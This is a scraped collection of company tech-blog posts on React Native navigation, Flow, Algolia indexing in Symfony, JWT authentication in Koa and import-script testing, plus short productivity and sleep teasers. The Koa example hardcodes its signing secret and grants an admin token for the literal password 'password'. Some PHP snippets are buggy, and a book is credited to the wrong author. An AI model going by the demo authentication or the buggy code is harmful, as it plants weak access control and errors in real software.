moment.\nWe\u2019ve given a style to our Navigator\n\nWhat should our renderScene do?\nWell, it should render our component.\nLet\u2019s see how to write this:\nindex.ios.js\nrenderScene = (route, navigator) => {\r\n  return React.createElement(route.component, {navigator: navigator});\r\n}\r\n\nOur renderScene method takes two arguments.\nThe first one is the component we want to mount and the second one is the navigator itself.\nWe\u2019ll need to pass the navigator to our components as a prop to be able to navigate back and forth.\nFirstComponent\nstatic route(props) {\r\n  return {\r\n    id: 'FirstPage',\r\n    component: FirstPage\r\n  };\r\n}\r\n\nLet\u2019s run our app\u2026 Here is how it should look.\n\n\n\nFirst Screen\nSecond Screen\n\n\n\n\n\n\n\n\n\nNow, there\u2019s something missing here.\nIndeed, when navigating in an app, we\u2019re expecting a Navbar on the top to navigate!\nPutting a Navbar\nNavigator has a way of doing this.\nYou can pass a component written by your hands to it and it will display it as a Navbar.\nHowever, react native being an open source project, the community has developed a lot of packages for us to use.\nIn this repository, you\u2019ll find a non-exhaustive list of great packages.\nHere, we\u2019ll be using the package React Native Navbar.\nLet\u2019s install it.\nnpm i --save react-native-navbar\r\n\nThen, let\u2019s import it in our two views.\nimport NavBar from 'react-native-navbar';\r\n\nFirstComponent\nrender() {\r\n  const titleConfig = {\r\n    title: 'First Component',\r\n  };\r\n\r\n  return (\r\n    <View style={styles.container}>\r\n      <NavBar title={titleConfig} />\r\n      <View style={styles.content}>\r\n        <Text>This is the first view</Text>\r\n        <TouchableHighlight onPress={() => this.props.navigator.push(SecondPage.route())} style={styles.button}>\r\n          <Text>Go to second view</Text>\r\n        </TouchableHighlight>\r\n      </View>\r\n    </View>\r\n  );\r\n}\r\n\nSecondComponent\nrender() {\r\n  const titleConfig = {\r\n    title: 'Second Component',\r\n  };\r\n\r\n  const leftButtonConfig = {\r\n    title: 'Previous',\r\n    handler: () => this.props.navigator.pop(),\r\n  }\r\n\r\n  return (\r\n    <View style={styles.container}>\r\n      <NavBar title={titleConfig} leftButton={leftButtonConfig} />\r\n      <View style={styles.content}>\r\n        <Text>This is the second view</Text>\r\n      </View>\r\n    </View>\r\n  );\r\n}\r\n\nIn order for our components to render as we expect them to, we need to change a bit our components\u2019 styles.\ncontainer: {\r\n  flex: 1\r\n},\r\ncontent: {\r\n  flex: 1,\r\n  backgroundColor: '#FFFF00',\r\n  justifyContent: 'center',\r\n  alignItems: 'center'\r\n}\r\n\nHere is what we have now!\n\nConclusion\nWe now have a fully functional React Native app.\nOf course, it doesn\u2019t do much yet but I\u2019m sure you\u2019ll be able to build on this.\nTo go further in building apps, the next good thing to take a look at is redux.\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGr\u00e9goire Hamaide\r\n  \t\t\t\r\n  \t\t\t\tAgile Developer @ Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nStatic Type Checking is Life, Static Type Checking is Love\nJavascript has been a hot topic for web developers for some time now.\nIt\u2019s fast, runs everywhere and offers many wonderful frameworks such as Angular and React.\nHowever, its lack of static typing can be a real pain for developers, bugs only appear at runtime, are hard to find and code refactoring is a real challenge.\nThis is where static type checkers such as TypeScript and Flow come into play with their main features being:\n\nHelping to catch errors early, close to the root cause and at buildtime\nImproving code readability and maintainability\n\nWhen Should You Use a Type Checker?\n\nFor long and complex projects\nIf there is a chance you will have to refactor it at some point\nIf team members change regularly\n\nIf you are sick and tired of random errors induced by typing errors, you should definitely join the static type checking club!\nWhat Does Flow Bring to the Game?\nWhat Flow Is\nFlow is a JavaScript static type checker. The open source project has 9,000+ stars on GitHub at the time this article is being written.\nThe project is active \u2013 more than 30 commits are merged in average every week with bug fixing and new features.\n\nIt was introduced by Facebook in 2014 with two main features:\n\nFinding type errors in your code\nOffering a static typing syntax\n\nHow does it work?\nFlow is a checker while TypeScript is a compiler.\nFlow works in two different ways:\n\nYou specify to the tool the types you expect, and it checks your code based on this as shown below\n\n\n\nThe tool can deduce expected types by itself and check the code with those assumptions\n\nThe second point, called type inference, is one of the main features of Flow. It makes it possible for Flow to check your code even if you don\u2019t adapt it, you can see an example in the code below.\n\n\nTo run Flow code Facebook recommends to use Babel to strip static types before serving the client, you can find more information about this here\nWhy Should You Use Flow?\n\nIt works well with JSX syntax and React\nRefactoring so easy (it can match module and function names between files and pops up an error if you missed an old occurrence)\nIt\u2019s opt-in so you can check your code incrementally\nIt implements weak checking for legacy code\nIt allows you to use \u201cmaybe types\u201d (undefined, null, and mixed) so that you are free to keep some stuff dynamic\n\nGetting Started with Flow\nHow Can you Start Using it?\nTo get started with Flow on an existing project you\u2019ll need to go through some basic steps:\nIn your project\u2019s directory\n\nCreate a Flow config file touch .flowconfig\nInstall the Flow module npm install --save-dev flow-bin\nAdd this line in the package.json:\n\n\r\n\"scripts: {\r\n   \"flow\": \"node node_modules/.bin/flow\"\r\n}\r\n\n\nNow use npm run flow at the root of your project\n\nIt\u2019s that easy!\nAnd now you can start implementing it in your code by adding an annotation at the top of the files you want to check:\n\r\n    // @flow\r\n\r\n    var str = 'hello world!';\r\n    console.log(str);\r\n\nIf you get npm error info after the command it\u2019s the way npm reacts to Flow exiting with errors, that won\u2019t affect Flow\u2019s accuracy.\nIf you Use it, Use it Right!\nThere are two ways to use Flow, the right way and the wrong way.\nYou can always use it with no further installs by running\nnpm run flow in your CLI which will show you all the typing errors it can find.\nBut the most efficient and fastest way of using it is through an IDE plugin of which here are some examples:\n\nFlow for Atom\nFlow for VSCode\nFlow for Vim\n\nThese plugins usually start the flow server and allow you to see errors as you write your code, much like a linter would.\n\nIt saves you the pain of writing then checking so that you can write \u201cflowless\u201d code right from the start ;).\nConclusion\nMake Your Code Safer and More Reliable\nFlow will increase the safety and maintainability of your app.\nIt can prevent a lot of type induced regressions on your projects and make bugs easier to find as they appear at buildtime or even as you write thanks to Flow IDE linters.\nIt will make your code more understandable and safer to refactor.\nSpare Yourself Type Checking Tests\nYou will never have to write tests like this ever again!\n\r\n  it 'should create a favorites array in local storage', ->\r\n    $localStorage.favorites.should.be.an.array\r\n    $localStorage.favorites.should.be.empty\r\n\nWhy Flow Instead of TypeScript ?\nFlow is growing really fast with a lot of support and most of all, it works really great with Facebook\u2019s React framework which makes it even more exciting.\nFlow handles non-nullable types as default while TypeScript does not and Flow is generally more expressive. That means that Flow will catch more errors related to variables ending up null.\nFinally, Flow requires a smaller effort to be implemented on existing projects as you can start checking your files gradually.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJ\u00e9r\u00e9my Dardour\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOr, how I got started with todo lists after failing again and\u00a0again\nWhere is your whale in your life? Do you feel overwhelmed in your personal life or at work? This is it. Sometimes your whale gets lighter; this is when you go on holidays, this is on Friday night before a good week-end. But most of the time you curse at your work or you are angry at your colleague Billy for interrupting you all day long. But there is a way out, and I can lead the way. My goal was to form a new habit of throwing my whale into a todo list. It seems crazy that writing things down makes you more efficient than keeping everything in your mind, but it works. I was introduced to this concept by the most productive writer on productivity that I know of, Brian Tracy, in his books Eat That Frog, Getting Things Done, and in this short video. Yet I kept struggling with actually applying those concepts to my daily life. In this article, I want to describe my first successful step into setting a habit of pouring my whale in writings so that you can get inspired in doing the same, because writing down all my \u201cOh I should do this\u201d all the time has been transformative for me.\nRead the rest of the story on Medium.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA simple experiment to improve your sleep without\u00a0gadgets\nLet\u2019s get something straight. Not sleeping enough or well enough is bad for you and for others. It makes you fat, makes you angry, makes you sick. In his book Sleep Thieves, the neuropsychologist Stanley Coren provides evidence that missing two hours of sleep each day for a week can make you lose thirty IQ points (which turns a highly intelligent person to someone who scores below average). Finally, know that sleep deprivation has been one of the root causes in the Challenger or Chernobyl disasters.\nThe basics\nHow much time do you need to sleep? Basically, science says: 8 hours a day assuming you\u2019re an adult, since the actual time depends on your age. Your sleep alternates between:\n\na long non-REM (also called \u201cnot the famous rock band\u201d) sleep phase that has four stages. You only need to know that the higher the stage, the deeper the sleep, and the deeper the sleep, the more motionless you are and the more difficult it is for you to wake up.\na short REM sleep phase, where your eyes move from left to right and your brain\u2019s activity skyrockets. Note that both REM and non-REM sleep phases are important to your sleep, your memory, and that they both trigger dreams.\nsometimes, a brief awakening. You are usually not conscious during this phase, except if you badly want to pee.\n\nYou can see how this works on the hypnogram below.\n\nThis hypnogram, however, is slightly misleading. You are led to believe that in general, all sleep cycles have the same average duration, and it is not the case. The first cycle is slightly shorter, lasting 70\u2013100 minutes, while the other ones last 90\u2013120 minutes (source).\nTo win the sleeping game, you must:\n\nSleep between 7 and 9 hours without interruption\nWake up during an REM phase, which is the phase in which you\u2019re most likely to wake up naturally.\n\nWant to win? Read the rest on Medium by clicking here !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFlavian Hautbois\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCreating a search engine from scratch may be tricky and lengthy. That is why, when I wanted to implement one in my Symfony app, I chose to use Algolia through its SaaS model.\nThanks to their Symfony bundle, I managed to map my Person and Company entities from my main database to their indexes with a couple of line commands. From then on, my users could carry out a research among the persons and companies registered in my online directory.\n\nHere come the problems\nThen I wanted to index news articles. Unfortunately my articles were stored in a second database, which was not handled by the Algolia bundle. I decided to create my own Symfony command by using Algolia\u2019s API Client for PHP. In it, I queried all published articles in my table and indexed them one by one with the API client.\n\nHowever, as I had tens of thousands of articles stored in my table, my server crashed when I tried to index them all in one go. So I added logs to keep track of the already indexed articles and an argument to the command to specify where to restart.\n\nclass IndexArticleCommand extends Command\r\n{\r\n    private $articleRepository;\r\n\r\n    private $algoliaApplicationId;\r\n\r\n    private $algoliaApiKey;\r\n\r\n    public function __construct(ArticleRepository $articleRepository, $algoliaApplicationId, $algoliaApiKey)\r\n    {\r\n        $this->articleRepository = $articleRepository;\r\n        $this->algoliaApplicationId = $algoliaApplicationId;\r\n        $this->algoliaApiKey = $algoliaApiKey;\r\n    }\r\n\r\n    protected function configure()\r\n    {\r\n        $this\r\n            ->setName('algolia:article:index')\r\n            ->setDescription('Index all published articles in Algolia')\r\n            ->addArgument('indexName', InputArgument::REQUIRED, 'What is the name of your index?')\r\n            ->addArgument('startId', InputArgument::OPTIONAL, 'What content do you want to start indexing at? If not set, you start at 0.')\r\n        ;\r\n    }\r\n\r\n    protected function execute(InputInterface $input, OutputInterface $output)\r\n    {\r\n        $indexName = $input->getArgument('indexName');\r\n        $startId = $input->getArgument('startId') ? $input->getArgument('startId') : 0;\r\n\r\n        $algoliaClient = new AlgoliaClient(\r\n            $this->algoliaApplicationId,\r\n            $this->algoliaApiKey\r\n        );\r\n        $algoliaIndex = $algoliaClient->initIndex($indexName);\r\n\r\n        $publishedArticles = $this->articleRepository->getAllPublishedArticles($startId);\r\n\r\n        foreach ($publishedArticles as $article) {\r\n            $algoliaIndex->addObject(\r\n                [\r\n                    'title' => $article->getTitle(),\r\n                    'body' => $article->getBody(),\r\n                    'publishedAt' => $article->getPublishedAt(),\r\n                    'image' => $article->getCoverImage(),\r\n                    'objectID' => $article->getId()\r\n                ]\r\n            );\r\n        }\r\n\r\n        $output->writeln('Article #' . $article->getId() . ' indexed');\r\n    }\r\n}\r\n\n\nWhat now?\nSo the articles were indexed and I was able to see them in my Algolia dashboard. Though I was not able to automatically update my Article index as my Article entity and my Article index were not mapped. In other words, when I updated a company for instance from my app administration page, my Company index on Algolia was automatically updated as well, but it was not the case to update my Article index.\nTo make things even worse, news articles were written and updated by journalists on their Ruby on Rails app that I had no control over at all. That is why I had to be creative. Luckily enough, a lot of information were stored in the Article table such as the last modification date. Thanks to that, I could write a new Symfony command that queried all articles that were modified in the last minute and updated the Article index accordingly.\n\nclass UpdateArticleIndexCommand extends Command\r\n{\r\n    private $articleRepository;\r\n\r\n    private $algoliaApplicationId;\r\n\r\n    private $algoliaApiKey;\r\n\r\n    public function __construct(ArticleRepository $articleRepository, $algoliaApplicationId, $algoliaApiKey)\r\n    {\r\n        $this->articleRepository = $articleRepository;\r\n        $this->algoliaApplicationId = $algoliaApplicationId;\r\n        $this->algoliaApiKey = $algoliaApiKey;\r\n    }\r\n\r\n    protected function configure()\r\n    {\r\n        $this\r\n            ->setName('algolia:article:update')\r\n            ->setDescription('Update recently modified articles in Algolia')\r\n        ;\r\n    }\r\n\r\n    private function formatArticleInArray(Article $article) {\r\n        return [\r\n            'title' => $article->getTitle(),\r\n            'body' => $article->getBody(),\r\n            'publishedAt' => $article->getPublishedAt(),\r\n            'image' => $article->getCoverImage(),\r\n            'objectID' => $article->getId()\r\n        ]\r\n    }\r\n\r\n    protected function execute(InputInterface $input, OutputInterface $output)\r\n    {\r\n        $indexName = $input->getArgument('indexName');\r\n\r\n        $algoliaClient = new AlgoliaClient(\r\n            $this->algoliaApplicationId,\r\n            $this->algoliaApiKey\r\n        );\r\n        $algoliaIndex = $algoliaClient->initIndex($indexName);\r\n\r\n        $oneMinuteAgo = new \\DateTime()->modify('-1 minute');\r\n\r\n        $lastModifiedArticles = $this->articleRepository->getModifiedArticlesSince($oneMinuteAgo);\r\n\r\n        foreach ($lastModifiedArticles as $article) {\r\n            //If the article is published\r\n            if ($article->isPublished() == True) {\r\n                //If it exists in the index, we update it\r\n                if ($algoliaIndex->search($article->getTitle())) {\r\n                    $algoliaIndex->saveObject($this->formatArticleInArray($article));\r\n                    $output->writeln('Article #' . $article->getId() . ' updated');\r\n                //It it doesn't, we create it\r\n                } else {\r\n                    $algoliaIndex->addObject($this->formatArticleInArray($article));\r\n                    $output->writeln('Article #' . $article->getId() . ' indexed');\r\n                }\r\n            //If the content is now unpublished, we delete it\r\n            } else {\r\n                $algoliaIndex->deleteObject($article->getId());\r\n                $output->writeln('Article #' . $article->getId() . ' deleted');\r\n            }\r\n        }\r\n    }\r\n}\r\n\n\nConclusion\nAlgolia is a very powerful tool to quickly implement a search engine even though it may have some limits. However, those limits can be overcome thanks to their API client, as tedious as my solution may seem.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tC\u00e9dric Kui\r\n  \t\t\t\r\n  \t\t\t\tI enjoy browsing cat and panda GIFs while drinking tea. Oh, I am also a Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tKoa is the \u201cnew\u201d all the rage framework used with NodeJS. This guide aims at explaining how to set up efficiently an API protected with a JWT token.\nWhat we want to have at the end of this tutorial is an API protected from unauthenticated users.\nWe will use a JWT token to authenticate our users.\nWhat is JWT? Why should we use it?\nJWT stands for JSON web token. It is a standard token designed to exchange secured information and is mainly used for authentication purposes. JSON web tokens are small sized which allows them to be sent:\n\nthrough a URL\na POST parameter\ninside a HTTP header.\n\nThey are composed of three different parts separated by a dot:\n\nHeader: contains typically the hashing algorithm used and the type of the token which is JWT.\nPayload: the information you want to exchange with the token. Could be the user id and its role for example in the case of an authentication token.\nSignature: is used to verify the authenticity of the token. The signature is generated using the header, the payload and a secret. It can thus be used to check that the payload has not been altered.\n\nA classic JWT token looks like the following: <header>.<payload>.<signature>\nIn an authentication scenario, JWT tokens are used in the following way:\n\nthe user sends a login request with his credentials\nthe server authenticate the user\nthe server creates a token containing some information to recognise the user in the future\nthe server signs the token\nthe server sends the token back to the user\nthe user stores the token in the locale storage or in the cookies.\n\nOn his next requests:\n\nthe user sends the token in the header so that the server can identify him.\nthe server decodes the token to read the payload which can be used to identify the user\nthe server treats his request.\n\nThe user can\u2019t change the payload of his token to usurp the identity of another user. The payload is indeed used to generate the signature and an altered token will not be recognised as valid by the server.\nJWT tokens for authentication have the main advantage to not require session. The token is like an access card and it is the user who stores it, usually in a cookie or locale storage. The backend does not keep any tracks of the issued tokens.\nThe secret is not shared with the user, it is only stored on the server which makes it less likely to be cracked.\nJSON web tokens are also way smaller than SAML tokens which are their XML equivalent. It makes them a better choice to be passed in HTML and HTTP environments.\nOne drawback of using JWT is that a malicious user can make requests on someone else\u2019s name if he managed to find a valid token. That is the reason why it is important to use SSL to protect the token that will be sent on every request.\nSet up: our unprotected API\nAll the code is available at https://github.com/Theodo-UK/blog-koa-jwt\nIn this guide we will use an API with one entity and two methods available (GET and POST). Another endpoint will be created later on to allow users to log in. Here is a code sample for an unprotected API using koa, koa-router and koa-better-body to facilitate the parsing of the request. Note that the requests are expected to have a content type application/json.\n//index.js\r\n\r\nconst app = require('koa')();\r\nconst router = require('koa-router')();\r\nconst koaBetterBody = require('koa-better-body');\r\n\r\nconst customerService = require('./services/customerService');\r\n\r\napp.use(koaBetterBody({fields: 'body'}));\r\n\r\nrouter.get('/customer', function *(next) {\r\n  this.body = customerService.getCustomers();\r\n});\r\n\r\nrouter.get('/customer/:id', function *(next) {\r\n  if (customerService.getCustomer(this.params.id)) {\r\n    this.body = customerService.getCustomer(this.params.id);\r\n  }\r\n  else {\r\n    this.status = 404;\r\n    this.body = {\"error\": \"There is no customer with that id\"};\r\n  }\r\n});\r\n\r\nrouter.post('/customer', function *(next) {\r\n  this.body = customerService.postCustomer(this.request.body);\r\n});\r\n\r\napp\r\n  .use(router.routes())\r\n  .use(router.allowedMethods());\r\n\r\napp.listen(3000);\r\n\r\n\nHere the customerService is supposed to make the link between the API and the database. For the purpose of this example, this service is simply managing a javascript object containing the list of our customers as you can see below:\n//services/customerService.js\r\n\r\nconst customers = [\r\n  {\r\n    \"id\": 1,\r\n    \"first_name\": \"John\",\r\n    \"last_name\": \"Smith\",\r\n    \"date_of_birth\": \"1993-04-23T00:00:00.000Z\"\r\n  },\r\n  {\r\n    \"id\": 2,\r\n    \"first_name\": \"Justin\",\r\n    \"last_name\": \"Bieber\",\r\n    \"date_of_birth\": \"1994-04-23T00:00:00.000Z\"\r\n  }\r\n];\r\n\r\nlet maxId = 2;\r\n\r\nmodule.exports = {\r\n  getCustomers: function() {\r\n    return customers;\r\n  },\r\n  getCustomer: function(id) {\r\n    return customers.find(customer => customer.id === parseInt(id) || customer.id === id);\r\n  },\r\n  postCustomer: function(customer) {\r\n    maxId++;\r\n    customer.id = maxId;\r\n    customers.push(customer);\r\n    return this.getCustomer(maxId);\r\n  }\r\n}\r\n\nWith this code you should be able to call your API to get the list of customers and post new ones. For the moment, anyone can call the API but you probably want to restrict your API to authenticated users only. In the following section, we will see how to protect the POST endpoint from unauthenticated users.\n1st step: protect your API\nWe want to protect the API using JWT tokens, and for that we will use a middleware called koa-jwt. You can add this new file to your app to set up the middleware with your secret key:\n//middlewares/jwt.js\r\n\r\nconst koaJwt = require('koa-jwt');\r\n\r\nmodule.exports = koaJwt({\r\n  secret: 'A very secret key', // Should not be hardcoded\r\n});\r\n\nThe secret key should not be hardcoded but instead you can use an environment variable. Note that it is possible to use different secret key depending on the endpoint you are protecting for example. It is even possible to have different secret keys for each of your users.\nYou can now import the middleware in you main file:\n//index.js\r\n\r\nconst jwt = require('./middlewares/jwt');\r\n\nIt is then really easy to protect a specific endpoint, you just have to add the middleware to the stack of middlewares called by the endpoint, for example for our POST endpoint becomes:\n//index.js\r\n\r\nrouter.post('/customer', jwt, function *(next) {\r\n  this.body = customerService.postCustomer(this.request.body);\r\n});\r\n\nIf you now try to call this protected endpoint you should receive an error 401 with the message: \u201cNo Authorization header found\u201d. What is actually happening is that the jwt middleware checks if the request has the required authentication header, and if not, stops the stack of middleware and returns a 401.\nYou could try to add the jwt middleware earlier in the stack of middleware, then you would not be able to access any of the middlewares called afterwards. For example, if you add app.use(jwt); before declaring the first endpoint, none of the endpoints are accessible.\nNow that one of your endpoint is protected, it would be nice to be able to allow user authentication.\n2nd step: create a login endpoint and mechanism in the API\nFirst we need to create a new endpoint that has to be unprotected. Let\u2019s add the following code before the first call to jwt:\n//index.js\r\n\r\nrouter.post('/login', function *(next) {\r\n  authenticate(this);\r\n});\r\n\nAnd import the new authenticate middleware const authenticate = require('./middlewares/authenticate.js');\nThe authenticate middleware is the one in charge of the login mechanism. This is where you will check the credentials and also where you will create the jwt token if the credentials are valid.\n//middlewares/authenticate.js\r\n\r\nconst jwt = require('koa-jwt');\r\n\r\nmodule.exports = function (ctx) {\r\n  if (ctx.request.body.password === 'password') {\r\n    ctx.status = 200;\r\n    ctx.body = {\r\n      token: jwt.sign({ role: 'admin' }, 'A very secret key'), //Should be the same secret key as the one used is ./jwt.js\r\n      message: \"Successfully logged in!\"\r\n    };\r\n  } else {\r\n    ctx.status = ctx.status = 401;\r\n    ctx.body = {\r\n      message: \"Authentication failed\"\r\n    };\r\n  }\r\n  return ctx;\r\n}\r\n\nThis middleware is quite simple, it:\n\nchecks that the password sent with the request is the right one\nin that case returns the jwt token in the body of the answer.\n\nIn that example the token contains only one attribute role set as admin for anyone. The token is then signed using the same secret key than the one used to decode the token defined in middlewares/jwt.js. In the case of bad credentials, the middleware simply return a 401 with a message.\nYou can now access the protected endpoints by adding the jwt token in the request Authorization header: Bearer <token>.\nConclusion\nYou now have a ready to go protected api with a simple authentication mechanism! Enjoy!\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBruno Godefroy\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA major issue during my last project was regressions in production occurring twice a week. The PO felt anxious, and the project was in danger,\neven though the team was reactive and able to quickly fix regressions.\nWhy so many regressions?\nA good explanation could be the lack of tests. However, both Node.js/Express.js back-end and AngularJS front-end were 80% covered by unit/end-to-end tests. Tests are supposed to prevent regressions so what\u2019s wrong with them?\nSomething was clear: most regressions were related to the data.\nData regression: a case study\nIn our app, people can have phone numbers on their profile page. The app receives on a daily basis a file containing people IDs and phone numbers. The team wrote a script loading phone numbers into the database every night.\nA regression occurred on the second day: people have the same phone number twice on their profile pages  This is typically a data issue:\n\nthe front-end showed twice the same phone number on profile pages because that\u2019s what it received from the back-end;\nthe back-end served twice the same phone number because people have twice phone numbers in the database.\n\nThe culprit was the import script that did not remove old phone numbers before loading the new ones. Neither back-end tests nor front-end tests could have spotted this issue. If we look at the data flow of the application: import scripts lack tests!\n\nWhat do we need to test?\nData come from CSV files we received daily through a FTP. A Python script fetches the files and loads data in the database every night.\nFile encoding\nFiles are encoded in various formats: UTF-8, ISO-8859-1, Windows-1252 and even EBCDIC!. Checking that scripts can properly read, decode and reincode these files is a first step.\nData formatting\nData is usually processed before insertion into database. Due to having heterogeneous sources, phone numbers have various format e.g., \u201c0123456789\u201d, \u201c123456789\u201d, \u201c0033123456789\u201d, \u201c+33123456789\u201d or \u201c6789 \u2013 0123456789\u201d. To prevent bad format errors from occurring later in the process, the import scripts format all phone number in a standard format, say \u201c+33123456789\u201d.\nA good test should verify that loading \u201c0033123456789\u201d from a CSV file ends up with \u201c+33123456789\u201d in db.\nData consistency\nThe import scripts not only load data but also establish relations upon it. For instance, imagine the script loads two csv files respectively containing people names and phone numbers:\n\n\n\nID\nlastname\nfirstname\n\nID\nphone number\n\n\n\n\n424242\nObama\nMichelle\n\n424242\n+33123456789\n\n\n\nOur test should check that Michelle Obama gets the phone number \u201c+33123456789\u201d in the database.\nData resilience\nThe import script is launched every day, hence all data is refreshed every day. Let say that the app received the following two files respectively on day 0 and day 1:\n\n\n\nID\nphone number\n\nID\nphone number\n\n\n\n\n424242\n+33123456789\n\n424242\n+33123456789\n\n\n424242\n+33123456790\n\n424242\n+33123456791\n\n\n\nOn day 0, Michelle Obama should have two phone numbers \u201c+33123456789\u201d and \u201c+33123456790\u201d. On day 1, we expect the import script to remove \u201c+33123456790\u201d and to add \u201c+33123456791\u201d so that Michelle ends up with two phone numbers again.\nHow do we write the test?\nThe directory structure of the test folder looks like this:\ntest\r\n\u251c\u2500\u2500 import-script-test.py\r\n\u251c\u2500\u2500 payloads\r\n|   \u251c\u2500\u2500 day0 // Folder containing csv files that are loaded on day 0\r\n|   |   \u2514\u2500\u2500 names.csv\r\n|   |   \u2514\u2500\u2500 phone_numbers.csv\r\n|   \u251c\u2500\u2500 day1 // Folder containing csv files that are loaded on day 1\r\n|   |   \u2514\u2500\u2500 names.csv\r\n|   |   \u2514\u2500\u2500 phone_numbers.csv\r\n|   \u251c\u2500\u2500 day2 // Folder containing csv files that are loaded on day 2\r\n|   |   \u2514\u2500\u2500 ...\r\n| ...\r\n\u251c\u2500\u2500 data\r\n|   \u251c\u2500\u2500 day0 // Folder containing a dump of the expected data for day 0\r\n|   |   \u2514\u2500\u2500 people.json\r\n|   \u251c\u2500\u2500 day1 // Folder containing a dump of the expected data for day 1\r\n|   |   \u2514\u2500\u2500 people.json\r\n|   \u251c\u2500\u2500 day2 // Folder containing a dump of the expected data for day 2\r\n|   |   \u2514\u2500\u2500 ...\r\n... ...\r\n\nThe test import-script-test.py is written in Python and consists in:\n\nemptying the test database;\nloading test/payload/day0/*.csv files with the import scripts;\ngetting a JSON extraction of the database;\ncomparing \u201cfield by field\u201d the extraction with test/data/day0/people.json;\nstarting over again steps 1, 2 and 3 for day1, day2, \u2026 and so on.\n\n\nIt is an end-to-end test for the import script that allows us to verify all the aforementioned points. Payload files are kept small so that the test can be easily updated. Running consecutive imports allows to check data resilience.\nEpilogue\nTesting the import scripts prevents many regressions due to data.\nNot all projects need import scripts tests. You should evaluate the data flow of your app to decide whether it is worth it.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Toubhans\r\n  \t\t\t\r\n  \t\t\t\tWeb-developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
